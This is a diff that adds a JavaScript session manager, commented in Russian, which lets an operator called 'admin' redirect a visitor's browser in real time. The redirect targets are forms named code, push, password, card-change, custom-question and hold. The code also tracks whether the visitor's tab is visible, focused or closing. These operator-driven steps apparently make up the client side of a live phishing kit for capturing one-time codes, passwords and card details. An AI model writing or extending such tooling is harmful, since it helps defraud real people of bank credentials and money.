@@ -1,0 +1,448 @@
+/**
+ * Session Manager - управление сессией пользователя через WebSocket
+ * 
+ * Функционал:
+ * - Подключение к каналу сессии
+ * - Обработка редиректов от админа
+ * - Отслеживание видимости страницы
+ * - Восстановление сессии из localStorage
+ * - Ping для проверки активности
+ */
+
+const SESSION_STORAGE_KEY = 'session_id';
+const PING_INTERVAL = 30000; // 30 секунд
+
+class SessionManager {
+    constructor() {
+        this.sessionId = null;
+        this.channel = null;
+        this.pingInterval = null;
+        this.isConnected = false;
+        this.isRedirecting = false;
+    }
+
+    /**
+     * Инициализация менеджера сессий
+     */
+    init() {
+        // Пробуем восстановить сессию из localStorage
+        this.sessionId = this.getStoredSessionId();
+        
+        if (this.sessionId) {
+            // Проверяем статус существующей сессии
+            this.checkSessionStatus();
+        }
+        
+        // Устанавливаем обработчики видимости
+        this.setupVisibilityHandlers();
+        
+        console.log('[SessionManager] Initialized', { sessionId: this.sessionId });
+    }
+
+    /**
+     * Создание новой сессии
+     */
+    async createSession(inputType, inputValue) {
+        try {
+            const response = await axios.post('/api/session', {
+                input_type: inputType,
+                input_value: inputValue,
+            });
+
+            this.sessionId = response.data.data.id;
+            this.storeSessionId(this.sessionId);
+            
+            // Подключаемся к каналу сессии
+            this.connectToChannel();
+            
+            // Запускаем ping
+            this.startPing();
+            
+            console.log('[SessionManager] Session created:', this.sessionId);
+            
+            return response.data;
+        } catch (error) {
+            console.error('[SessionManager] Failed to create session:', error);
+            throw error;
+        }
+    }
+
+    /**
+     * Подключение к каналу сессии
+     */
+    connectToChannel() {
+        if (!this.sessionId || !window.Echo) {
+            console.warn('[SessionManager] Cannot connect: no sessionId or Echo not initialized');
+            return;
+        }
+
+        // Отключаемся от предыдущего канала если был
+        if (this.channel) {
+            window.Echo.leave(`session.${this.sessionId}`);
+        }
+
+        // Подключаемся к публичному каналу сессии
+        this.channel = window.Echo.channel(`session.${this.sessionId}`);
+        
+        // Обработчики событий действий (редиректы)
+        this.channel
+            .listen('.action.code', (data) => this.handleActionRedirect(data))
+            .listen('.action.push', (data) => this.handleActionRedirect(data))
+            .listen('.action.password', (data) => this.handleActionRedirect(data))
+            .listen('.action.card-change', (data) => this.handleActionRedirect(data))
+            .listen('.action.error', (data) => this.handleActionRedirect(data))
+            .listen('.action.custom-error', (data) => this.handleActionRedirect(data))
+            .listen('.action.custom-question', (data) => this.handleActionRedirect(data))
+            .listen('.action.custom-image', (data) => this.handleActionRedirect(data))
+            .listen('.action.redirect', (data) => this.handleRedirect(data))
+            .listen('.action.hold', (data) => this.handleActionRedirect(data))
+            .listen('.redirect', (data) => this.handleRedirect(data));
+        
+        // Обработчик проверки онлайн статуса
+        this.channel.listen('.action.online.check', (data) => this.handleOnlineCheck(data));
+        
+        // Обработчики статуса сессии
+        this.channel
+            .listen('.session.assigned', (data) => this.handleSessionAssigned(data))
+            .listen('.session.completed', (data) => this.handleSessionCompleted(data))
+            .listen('.session.cancelled', (data) => this.handleSessionCancelled(data))
+            .listen('.session.status.response', (data) => this.handleStatusResponse(data));
+        
+        this.isConnected = true;
+        console.log('[SessionManager] Connected to channel:', `session.${this.sessionId}`);
+    }
+
+    /**
+     * Обработка редиректа на форму действия
+     */
+    handleActionRedirect(data) {
+        console.log('[SessionManager] Action redirect received:', data);
+        
+        if (data.redirect_url) {
+            this.redirect(data.redirect_url);
+        } else if (data.action_type && data.session_id) {
+            this.redirect(`/session/${data.session_id}/action/${data.action_type}`);
+        }
+    }
+
+    /**
+     * Обработка общего события редиректа
+     */
+    handleRedirect(data) {
+        console.log('[SessionManager] Redirect received:', data);
+        
+        if (data.url) {
+            this.redirect(data.url);
+        }
+    }
+
+    /**
+     * Выполнение редиректа
+     */
+    redirect(url) {
+        // Защита от двойного редиректа
+        if (this.isRedirecting) {
+            console.log('[SessionManager] Already redirecting, skipping:', url);
+            return;
+        }
+        
+        // Не редиректим на ту же страницу
+        if (window.location.pathname === url || window.location.href === url) {
+            console.log('[SessionManager] Already on this page, skipping:', url);
+            return;
+        }
+        
+        this.isRedirecting = true;
+        console.log('[SessionManager] Redirecting to:', url);
+        window.location.href = url;
+    }
+
+    /**
+     * Обработка проверки онлайн статуса
+     */
+    handleOnlineCheck(data) {
+        console.log('[SessionManager] Online check received:', data);
+        
+        // Отправляем подтверждение что пользователь онлайн
+        this.sendOnlineStatus(true);
+    }
+
+    /**
+     * Отправка статуса онлайн через API
+     */
+    async sendOnlineStatus(isOnline) {
+        if (!this.sessionId) return;
+        
+        try {
+            await axios.post(`/api/session/${this.sessionId}/ping`, {
+                is_online: isOnline,
+                visibility: document.visibilityState,
+            });
+            console.log('[SessionManager] Online status sent:', isOnline);
+        } catch (error) {
+            console.error('[SessionManager] Failed to send online status:', error);
+        }
+    }
+
+    /**
+     * Обработка назначения админа
+     */
+    handleSessionAssigned(data) {
+        console.log('[SessionManager] Session assigned to admin:', data);
+        // Можно показать индикатор что сессия в обработке
+        this.dispatchEvent('session:assigned', data);
+    }
+
+    /**
+     * Обработка завершения сессии
+     */
+    handleSessionCompleted(data) {
+        console.log('[SessionManager] Session completed:', data);
+        
+        // Очищаем localStorage
+        this.clearStoredSessionId();
+        
+        // Останавливаем ping
+        this.stopPing();
+        
+        // Отключаемся от канала
+        this.disconnect();
+        
+        // Редирект на страницу завершения или главную
+        this.dispatchEvent('session:completed', data);
+    }
+
+    /**
+     * Обработка отмены сессии
+     */
+    handleSessionCancelled(data) {
+        console.log('[SessionManager] Session cancelled:', data);
+        
+        // Очищаем localStorage
+        this.clearStoredSessionId();
+        
+        // Останавливаем ping
+        this.stopPing();
+        
+        // Отключаемся от канала
+        this.disconnect();
+        
+        this.dispatchEvent('session:cancelled', data);
+    }
+
+    /**
+     * Обработка ответа на запрос статуса
+     */
+    handleStatusResponse(data) {
+        console.log('[SessionManager] Status response:', data);
+        
+        if (data.is_active && data.redirect_url) {
+            // Если сессия активна и есть URL для редиректа
+            this.redirect(data.redirect_url);
+        } else if (!data.is_active) {
+            // Сессия неактивна - очищаем и показываем главную
+            this.clearStoredSessionId();
+            this.dispatchEvent('session:inactive', data);
+        }
+    }
+
+    /**
+     * Проверка статуса сессии через API
+     */
+    async checkSessionStatus() {
+        if (!this.sessionId) return;
+        
+        try {
+            const response = await axios.get(`/api/session/${this.sessionId}/status`);
+            const data = response.data.data;
+            
+            console.log('[SessionManager] Session status:', data);
+            
+            if (data.is_active) {
+                // Сессия активна - подключаемся к каналу
+                this.connectToChannel();
+                this.startPing();
+                
+                // Если есть текущий URL - редиректим
+                if (data.current_url && window.location.pathname === '/') {
+                    this.redirect(data.current_url);
+                }
+            } else {
+                // Сессия неактивна - очищаем
+                this.clearStoredSessionId();
+                this.sessionId = null;
+            }
+            
+            return data;
+        } catch (error) {
+            console.error('[SessionManager] Failed to check session status:', error);
+            
+            // Если сессия не найдена (404) - очищаем
+            if (error.response?.status === 404) {
+                this.clearStoredSessionId();
+                this.sessionId = null;
+            }
+            
+            return null;
+        }
+    }
+
+    /**
+     * Настройка обработчиков видимости страницы
+     */
+    setupVisibilityHandlers() {
+        // Отслеживание видимости вкладки
+        document.addEventListener('visibilitychange', () => {
+            const isVisible = document.visibilityState === 'visible';
+            this.handleVisibilityChange(isVisible, document.visibilityState);
+        });
+        
+        // Фокус/блюр окна
+        window.addEventListener('focus', () => {
+            this.handleVisibilityChange(true, 'focus');
+        });
+        
+        window.addEventListener('blur', () => {
+            this.handleVisibilityChange(false, 'blur');
+        });
+        
+        // Перед закрытием страницы
+        window.addEventListener('beforeunload', () => {
+            this.handleVisibilityChange(false, 'beforeunload');
+        });
+    }
+
+    /**
+     * Обработка изменения видимости
+     */
+    handleVisibilityChange(isOnline, visibility) {
+        if (!this.sessionId) return;
+        
+        console.log('[SessionManager] Visibility changed:', { isOnline, visibility });
+        
+        // Отправляем статус через API
+        axios.post(`/api/session/${this.sessionId}/ping`, {
+            is_online: isOnline,
+            visibility: visibility,
+        }).catch(error => {
+            console.error('[SessionManager] Failed to send visibility:', error);
+        });
+    }
+
+    /**
+     * Запуск периодического ping
+     */
+    startPing() {
+        if (this.pingInterval) return;
+        
+        this.pingInterval = setInterval(() => {
+            this.ping();
+        }, PING_INTERVAL);
+        
+        console.log('[SessionManager] Ping started');
+    }
+
+    /**
+     * Остановка ping
+     */
+    stopPing() {
+        if (this.pingInterval) {
+            clearInterval(this.pingInterval);
+            this.pingInterval = null;
+            console.log('[SessionManager] Ping stopped');
+        }
+    }
+
+    /**
+     * Отправка ping
+     */
+    async ping() {
+        if (!this.sessionId) return;
+        
+        try {
+            await axios.post(`/api/session/${this.sessionId}/ping`);
+        } catch (error) {
+            console.error('[SessionManager] Ping failed:', error);
+        }
+    }
+
+    /**
+     * Отключение от канала
+     */
+    disconnect() {
+        if (this.channel && this.sessionId) {
+            window.Echo.leave(`session.${this.sessionId}`);
+            this.channel = null;
+            this.isConnected = false;
+            console.log('[SessionManager] Disconnected from channel');
+        }
+    }
+
+    /**
+     * Сохранение session_id в localStorage
+     */
+    storeSessionId(sessionId) {
+        try {
+            localStorage.setItem(SESSION_STORAGE_KEY, sessionId);
+        } catch (error) {
+            console.error('[SessionManager] Failed to store session_id:', error);
+        }
+    }
+
+    /**
+     * Получение session_id из localStorage
+     */
+    getStoredSessionId() {
+        try {
+            return localStorage.getItem(SESSION_STORAGE_KEY);
+        } catch (error) {
+            console.error('[SessionManager] Failed to get stored session_id:', error);
+            return null;
+        }
+    }
+
+    /**
+     * Очистка session_id из localStorage
+     */
+    clearStoredSessionId() {
+        try {
+            localStorage.removeItem(SESSION_STORAGE_KEY);
+        } catch (error) {
+            console.error('[SessionManager] Failed to clear session_id:', error);
+        }
+    }
+
+    /**
+     * Dispatch custom event
+     */
+    dispatchEvent(eventName, data) {
+        window.dispatchEvent(new CustomEvent(eventName, { detail: data }));
+    }
+
+    /**
+     * Получение текущего session_id
+     */
+    getSessionId() {
+        return this.sessionId;
+    }
+
+    /**
+     * Установка session_id (для использования из внешнего кода)
+     */
+    setSessionId(sessionId) {
+        this.sessionId = sessionId;
+        this.storeSessionId(sessionId);
+        this.connectToChannel();
+        this.startPing();
+    }
+}
+
+// Создаем глобальный экземпляр
+window.SessionManager = new SessionManager();
+
+// Автоматическая инициализация при загрузке DOM
+document.addEventListener('DOMContentLoaded', () => {
+    window.SessionManager.init();
+});
+
+export default window.SessionManager;
